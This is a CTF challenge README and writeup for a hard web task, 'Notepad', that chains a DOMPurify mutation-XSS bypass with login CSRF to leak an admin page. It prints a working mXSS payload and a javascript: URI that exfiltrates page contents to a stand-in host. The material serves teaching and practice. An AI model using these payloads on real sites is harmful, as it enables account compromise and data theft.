# Notepad

**Category**: web

**Difficulty**: Hard

**Author**: todo#7331

## Flavour

I made a markdown editor for all your hacking notes!

## Description

A CSRF challenge which aims to get users to weaponize a self XSS.

Users able able to do a simple self stored xss using a well-known mxss payload to bypass dompurify. The difficulty will be to modify this payload into something that can perform non-trivial actions.
Pretty much every page on the site is also vulnerable to CSRF attacks. Players can hence direct the admin to a custom site containing two iframes to perform a CSRF chain exploit in order to leak the content of a admin-only route.

Difficulty is hard as it involves chaining together two medium-hard difficulty exploits.

## Writeup

_A solve script can be found in ./solve - the hosts will need to be updated_

1. Player notices the use of DOMPurify < 2.1.0, this has well known mxss bypasses.
    1. e.g. `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">`
    1. This payload needs to be slightly adapted since it is injected into a markdown environment which will wrap it in `<p></p>`
    1. Since this is naive we can wrap this as `a</p>MXSS<style>` to close the opening `<p>` and ignore the trailing `</p>`
2. Player is then able to setup a arbitrary self-xss
3. Player notices `/admin` endpoint which probably we want to look at
4. Player notices the compelte lack of csrf protections on a application that is very form driven
5. Player constructs a exploit chain as follows
    1. Player puts a self-xss payload which attempt to exfil the contents of `/admin`
    2. Player performs a CSRF to login the admin in as their own account
        1. The player observes that the login doesn't reset the `admin` flag and as such we can both trigger the self-xss and be a admin
    3. The self-xss triggers and exfils the flag

## Unintended Solves

 - An unintended solve was found where it was possible to send the admin directly to a `javascript:` uri, allowing simple xss without any csrf
   - Payload by @WeaveAche: `javascript:fetch("https://web-notepad-f6ed1a7d.chal-2021.duc.tf/admin").then(a => {a.text().then(b)=>fetch("http://example.com/?data="+btoa(b))})})`

## Running

`docker-compose up`

Can be shared, we don't even need to pray to the uuid gods.
